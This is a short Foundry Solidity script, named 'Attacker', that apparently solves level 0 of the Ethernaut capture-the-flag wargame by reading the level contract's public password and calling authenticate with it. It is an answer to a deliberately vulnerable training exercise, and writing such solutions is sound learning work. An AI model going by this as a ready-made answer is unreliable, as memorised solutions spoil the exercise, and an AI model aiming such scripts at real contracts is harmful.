// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/00-HelloEthernaut.sol";

contract Attacker is Script {
    Level0 level0 = Level0(0xcA795B3961748aef7e2EFC4C997813839797D77D);

    function run() public {
      vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
      level0.authenticate(level0.password());
      vm.stopBroadcast();
    }
}
